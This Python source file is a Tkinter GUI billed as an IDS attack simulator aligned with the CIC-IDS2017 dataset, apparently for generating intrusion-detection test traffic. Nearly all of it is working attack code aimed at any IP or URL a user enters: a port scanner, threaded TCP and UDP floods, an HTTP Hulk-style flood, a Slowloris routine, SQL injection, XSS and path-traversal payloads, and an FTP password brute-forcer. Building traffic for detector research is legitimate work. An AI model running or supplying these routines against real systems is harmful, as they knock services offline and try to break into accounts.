import socket
import threading
import time
import random
import tkinter as tk
from urllib.parse import urlparse
from tkinter import messagebox, scrolledtext, ttk

import requests


class IDSSimulatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("IDS Attack Simulator (CIC-IDS2017 Aligned)")
        self.root.geometry("700x620")

        self.is_running = False
        self.worker_threads = []
        self.log_lock = threading.Lock()

        config_frame = ttk.LabelFrame(root, text="Target")
        config_frame.pack(padx=10, pady=10, fill="x")

        ttk.Label(config_frame, text="Target IP / URL:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.target_ip_var = tk.StringVar(value="127.0.0.1")
        ttk.Entry(config_frame, textvariable=self.target_ip_var, width=34).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(config_frame, text="Target Port:").grid(row=0, column=2, padx=5, pady=5, sticky="e")
        self.target_port_var = tk.StringVar(value="80")
        ttk.Entry(config_frame, textvariable=self.target_port_var, width=10).grid(row=0, column=3, padx=5, pady=5)

        ttk.Label(config_frame, text="Threads:").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.threads_var = tk.StringVar(value="20")
        ttk.Entry(config_frame, textvariable=self.threads_var, width=10).grid(row=1, column=1, padx=5, pady=5, sticky="w")

        ttk.Label(config_frame, text="Intensity:").grid(row=1, column=2, padx=5, pady=5, sticky="e")
        self.intensity_var = tk.StringVar(value="100")
        ttk.Entry(config_frame, textvariable=self.intensity_var, width=10).grid(row=1, column=3, padx=5, pady=5, sticky="w")

        attack_frame = ttk.LabelFrame(root, text="Attack Type (closer to CIC-IDS2017)")
        attack_frame.pack(padx=10, pady=5, fill="x")

        self.attack_type_var = tk.StringVar()
        self.attack_types = [
            "1. PortScan (fast short TCP probes)",
            "2. DDoS / DoS: TCP short-connection flood",
            "3. DDoS / DoS: UDP flood",
            "4. DoS: HTTP Hulk / GoldenEye style",
            "5. DoS: Slowloris",
            "6. Web Attack: SQLi / XSS / Traversal",
            "7. FTP-Patator style brute force",
        ]
        self.attack_dropdown = ttk.Combobox(
            attack_frame,
            textvariable=self.attack_type_var,
            values=self.attack_types,
            width=55,
            state="readonly",
        )
        self.attack_dropdown.current(3)
        self.attack_dropdown.pack(padx=10, pady=10)

        btn_frame = ttk.Frame(root)
        btn_frame.pack(padx=10, pady=5, fill="x")

        self.start_btn = ttk.Button(btn_frame, text="Start", command=self.start_attack)
        self.start_btn.pack(side="left", padx=20)

        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=20)

        log_frame = ttk.LabelFrame(root, text="Logs")
        log_frame.pack(padx=10, pady=10, fill="both", expand=True)

        self.log_area = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=18)
        self.log_area.pack(padx=5, pady=5, fill="both", expand=True)
        self.log_area.configure(state="disabled")

        self.log_message("Simulator initialized. Use attack modes aligned with CIC-IDS2017 patterns.")

    def log_message(self, msg):
        def _append():
            with self.log_lock:
                self.log_area.configure(state="normal")
                self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
                self.log_area.see(tk.END)
                self.log_area.configure(state="disabled")

        self.root.after(0, _append)

    def resolve_target(self, target_value, default_port):
        if target_value.startswith("http://") or target_value.startswith("https://"):
            parsed = urlparse(target_value)
            host = parsed.hostname or "127.0.0.1"
            port = parsed.port or (443 if parsed.scheme == "https" else default_port)
            path = parsed.path or "/"
            return host, port, path
        return target_value, default_port, "/"

    def build_http_request(self, host, path, method="GET", extra_headers=None, body=""):
        query_tail = f"?id={random.randint(1000, 999999)}&cache={random.randint(1000, 999999)}"
        headers = {
            "Host": host,
            "User-Agent": random.choice(
                [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                ]
            ),
            "Accept": "*/*",
            "Connection": "close",
            "Cache-Control": "no-cache",
        }
        if extra_headers:
            headers.update(extra_headers)

        request_lines = [f"{method} {path}{query_tail} HTTP/1.1"]
        request_lines.extend(f"{k}: {v}" for k, v in headers.items())
        if body:
            request_lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
        request_lines.append("")
        request_lines.append(body)
        return "\r\n".join(request_lines).encode("utf-8", errors="ignore")

    def create_tcp_socket(self, host, port, timeout=1.0):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock

    def start_attack(self):
        target = self.target_ip_var.get().strip()
        attack_choice = self.attack_type_var.get()

        try:
            port = int(self.target_port_var.get())
            threads = max(1, int(self.threads_var.get()))
            intensity = max(1, int(self.intensity_var.get()))
        except ValueError:
            messagebox.showerror("Error", "Port / Threads / Intensity must be integers")
            return

        if not target:
            messagebox.showerror("Error", "Please input target IP or URL")
            return

        self.is_running = True
        self.worker_threads = []
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log_message(f"Starting attack: {attack_choice}")
        self.log_message(f"Target={target}:{port}, threads={threads}, intensity={intensity}")

        for i in range(threads):
            worker = threading.Thread(
                target=self.attack_worker,
                args=(target, port, attack_choice, i, intensity),
                daemon=True,
            )
            self.worker_threads.append(worker)
            worker.start()

    def stop_attack(self):
        self.is_running = False
        self.log_message("Stopping all attack threads...")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")

    def attack_worker(self, target, port, attack_choice, thread_id, intensity):
        if "PortScan" in attack_choice:
            self.do_port_scan(target, thread_id, intensity)
        elif "TCP short-connection flood" in attack_choice:
            self.do_tcp_short_connection_flood(target, port, thread_id, intensity)
        elif "UDP flood" in attack_choice:
            self.do_udp_flood(target, port, thread_id, intensity)
        elif "Hulk / GoldenEye" in attack_choice:
            self.do_http_hulk(target, port, thread_id, intensity)
        elif "Slowloris" in attack_choice:
            self.do_slowloris(target, port, thread_id, intensity)
        elif "Web Attack" in attack_choice:
            self.do_web_attacks(target, port, thread_id, intensity)
        elif "FTP-Patator" in attack_choice:
            self.do_ftp_brute(target, port, thread_id, intensity)

    def do_port_scan(self, target, thread_id, intensity):
        host, _, _ = self.resolve_target(target, 80)
        common_ports = [
            20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1433, 1521, 1723, 3306, 3389, 5900, 8080,
        ]
        high_ports = random.sample(range(1024, 4096), min(max(20, intensity), 200))
        ports = common_ports + high_ports
        random.shuffle(ports)

        scanned = 0
        while self.is_running:
            for port in ports:
                if not self.is_running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.15)
                    sock.connect_ex((host, port))
                    sock.close()
                except OSError:
                    pass
                scanned += 1
                if scanned % 100 == 0:
                    self.log_message(f"[T{thread_id}] PortScan probes sent: {scanned}")
                time.sleep(0.002)

    def do_tcp_short_connection_flood(self, target, port, thread_id, intensity):
        host, port, path = self.resolve_target(target, port)
        sent = 0
        while self.is_running:
            burst = min(max(5, intensity // 5), 50)
            for _ in range(burst):
                if not self.is_running:
                    break
                try:
                    sock = self.create_tcp_socket(host, port, timeout=0.4)
                    if port in (80, 8080, 8000, 443):
                        req = self.build_http_request(host, path, method="GET")
                        sock.sendall(req)
                    else:
                        payload = f"PING {random.randint(1, 999999)}\r\n".encode("utf-8")
                        sock.sendall(payload)
                    sock.close()
                    sent += 1
                except OSError:
                    pass
            if sent and sent % 200 == 0:
                self.log_message(f"[T{thread_id}] TCP short connections sent: {sent}")

    def do_udp_flood(self, target, port, thread_id, intensity):
        host, port, _ = self.resolve_target(target, port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload_size = min(1400, max(256, intensity * 5))
        sent = 0
        try:
            while self.is_running:
                payload = random.randbytes(payload_size) if hasattr(random, "randbytes") else bytes(
                    random.getrandbits(8) for _ in range(payload_size)
                )
                try:
                    sock.sendto(payload, (host, port))
                    sent += 1
                    if sent % 500 == 0:
                        self.log_message(f"[T{thread_id}] UDP packets sent: {sent}")
                except OSError:
                    time.sleep(0.01)
        finally:
            sock.close()

    def do_http_hulk(self, target, port, thread_id, intensity):
        host, port, path = self.resolve_target(target, port)
        sent = 0
        methods = ["GET", "GET", "GET", "POST", "HEAD"]
        while self.is_running:
            try:
                sock = self.create_tcp_socket(host, port, timeout=0.5)
                method = random.choice(methods)
                body = ""
                headers = {
                    "Referer": f"http://{host}/?v={random.randint(1000, 999999)}",
                    "Pragma": "no-cache",
                }
                if method == "POST":
                    body = "username=admin&password=" + str(random.randint(100000, 999999))
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                request_data = self.build_http_request(host, path, method=method, extra_headers=headers, body=body)
                sock.sendall(request_data)
                sock.close()
                sent += 1
                if sent % 200 == 0:
                    self.log_message(f"[T{thread_id}] HTTP flood requests sent: {sent}")
            except OSError:
                time.sleep(0.005)

    def do_slowloris(self, target, port, thread_id, intensity):
        host, port, _ = self.resolve_target(target, port)
        sockets = []
        socket_goal = min(max(20, intensity), 200)
        self.log_message(f"[T{thread_id}] Building {socket_goal} Slowloris sockets...")

        def open_socket():
            sock = self.create_tcp_socket(host, port, timeout=4.0)
            sock.sendall(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode("utf-8"))
            sock.sendall(f"Host: {host}\r\n".encode("utf-8"))
            sock.sendall(b"User-Agent: Mozilla/5.0\r\n")
            return sock

        while self.is_running and len(sockets) < socket_goal:
            try:
                sockets.append(open_socket())
            except OSError:
                time.sleep(0.05)

        while self.is_running:
            alive = []
            for sock in sockets:
                if not self.is_running:
                    break
                try:
                    sock.sendall(f"X-a: {random.randint(1, 999999)}\r\n".encode("utf-8"))
                    alive.append(sock)
                except OSError:
                    try:
                        replacement = open_socket()
                        alive.append(replacement)
                    except OSError:
                        pass
            sockets = alive
            self.log_message(f"[T{thread_id}] Slowloris active sockets: {len(sockets)}")
            time.sleep(8)

        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass

    def do_web_attacks(self, target, port, thread_id, intensity):
        host, port, path = self.resolve_target(target, port)
        url = f"http://{host}:{port}{path}"
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "1 UNION SELECT null,version()",
        ]
        sent = 0
        session = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0", "Connection": "close"}

        while self.is_running:
            for payload in payloads:
                if not self.is_running:
                    break
                try:
                    params = {"id": payload, "search": payload, "q": payload}
                    session.get(url, params=params, headers=headers, timeout=1.5)
                    sent += 1
                    if sent % max(10, intensity // 2) == 0:
                        self.log_message(f"[T{thread_id}] Web payloads sent: {sent}")
                    time.sleep(0.15)
                except requests.RequestException:
                    time.sleep(0.05)

    def do_ftp_brute(self, target, port, thread_id, intensity):
        host, _, _ = self.resolve_target(target, port)
        ftp_port = 21
        users = ["admin", "root", "ftp", "test", "anonymous", "user"]
        passwords = [
            "123456", "admin", "password", "root", "123123", "qwerty", "letmein",
        ]
        attempts = 0

        while self.is_running:
            random.shuffle(users)
            random.shuffle(passwords)
            for user in users:
                for password in passwords:
                    if not self.is_running:
                        return
                    try:
                        sock = self.create_tcp_socket(host, ftp_port, timeout=1.5)
                        try:
                            sock.recv(1024)
                        except OSError:
                            pass
                        sock.sendall(f"USER {user}\r\n".encode("utf-8"))
                        try:
                            sock.recv(1024)
                        except OSError:
                            pass
                        sock.sendall(f"PASS {password}\r\n".encode("utf-8"))
                        try:
                            sock.recv(1024)
                        except OSError:
                            pass
                        sock.close()
                        attempts += 1
                        if attempts % max(20, intensity) == 0:
                            self.log_message(f"[T{thread_id}] FTP login attempts: {attempts}")
                    except OSError:
                        time.sleep(0.05)


if __name__ == "__main__":
    root = tk.Tk()
    app = IDSSimulatorApp(root)
    root.mainloop()
